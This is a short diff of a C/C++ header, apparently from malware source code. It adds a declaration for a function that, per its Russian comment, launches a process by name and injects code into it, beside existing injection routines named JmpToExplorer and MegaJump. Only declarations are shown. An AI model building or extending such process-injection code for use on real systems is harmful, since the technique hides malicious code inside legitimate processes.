@@ -52,6 +52,13 @@ BOOL WINAPI JmpToExplorer(TInjectFunction f_Main);
 //---------------------------------------------------
 BOOL WINAPI MegaJump(TInjectFunction f_Main);
 
+//---------------------------------------------------
+//  InjecIntoProcessByName
+//  Функция запускает процесс с именем AppName и
+//  инжектится в него
+//---------------------------------------------------
+BOOL WINAPI InjecIntoProcessByNameA(const char* AppName, const char* CmdLine,  TInjectFunction Function);
+
 namespace NewInject
 {
 
